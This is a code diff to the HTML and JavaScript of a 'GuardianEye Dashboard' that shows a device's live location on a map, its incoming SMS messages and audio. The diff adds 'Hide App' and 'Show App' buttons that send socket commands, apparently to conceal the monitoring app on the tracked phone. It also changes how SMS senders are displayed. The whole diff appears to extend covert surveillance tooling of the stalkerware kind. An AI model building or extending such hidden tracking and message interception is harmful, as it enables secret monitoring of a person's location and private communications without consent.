@@ -32,9 +32,9 @@
       border: 1px solid #ddd;
       border-radius: 8px;
     }
-    #startAudio {
-      display: block;
-      margin: 10px auto;
+    button {
+      display: inline-block;
+      margin: 10px;
       padding: 10px 20px;
       background: #007bff;
       color: #fff;
@@ -43,7 +43,7 @@
       cursor: pointer;
       font-size: 16px;
     }
-    #startAudio:hover {
+    button:hover {
       background: #0056b3;
     }
     #audioStatus {
@@ -92,12 +92,22 @@
     .eventList div:last-child {
       border-bottom: none;
     }
+    .control-buttons {
+      text-align: center;
+      margin: 20px 0;
+    }
   </style>
 </head>
 <body>
   <h1>GuardianEye Dashboard</h1>
 
   <div id="status">🔴 Disconnected</div>
+
+  <!-- New Control Buttons -->
+  <div class="control-buttons">
+    <button id="hideApp">👻 Hide App</button>
+    <button id="showApp">📲 Show App</button>
+  </div>
 
   <h2>Live Map</h2>
   <div id="map"></div>
@@ -149,6 +159,17 @@
     socket.on("disconnect", () => {
       statusDiv.innerText = "🔴 Disconnected";
       statusDiv.style.color = "red";
+    });
+
+    // === CONTROL BUTTONS ===
+    document.getElementById("hideApp").addEventListener("click", () => {
+      socket.emit("hide-app");
+      console.log("👻 Hide App command sent");
+    });
+
+    document.getElementById("showApp").addEventListener("click", () => {
+      socket.emit("show-app");
+      console.log("📲 Show App command sent");
     });
 
     // === MAP ===
@@ -248,7 +269,7 @@
     const smsList = document.getElementById("smsList");
     socket.on("sms-received", (sms) => {
       const div = document.createElement("div");
-      div.innerText = `[${new Date().toLocaleTimeString()}] ${sms.sender || "Unknown"}: ${sms.body}`;
+      div.innerText = `[${new Date().toLocaleTimeString()}] ${sms.number || "Unknown"}: ${sms.body}`;
       smsList.prepend(div);
     });
 
